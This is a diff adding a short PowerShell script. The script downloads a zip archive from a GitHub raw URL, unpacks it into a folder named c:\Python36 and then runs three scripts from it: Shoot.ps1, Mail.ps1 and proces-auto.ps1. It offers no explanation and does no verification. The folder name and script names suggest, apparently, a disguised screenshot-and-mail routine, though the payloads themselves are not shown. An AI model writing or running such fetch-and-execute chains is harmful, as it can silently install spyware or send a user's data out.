@@ -1,0 +1,8 @@
+﻿mkdir -Force -Path "c:\Python36\"
+Invoke-WebRequest -Uri "https://github.com/branderage/script/raw/main/gniffel-dick.zip" -OutFile "uit.zip"
+Expand-Archive "uit.zip" -DestinationPath "c:\Python36\"
+Copy-Item -Path "c:\Python36\Python36\*.*" -Destination "c:\Python36\"
+Remove-Item -Path "uit.zip"
+powershell.exe "c:\Python36\Shoot.ps1"
+powershell.exe "C:\Python36\Mail.ps1"
+powershell.exe "C:\Python36\proces-auto.ps1"
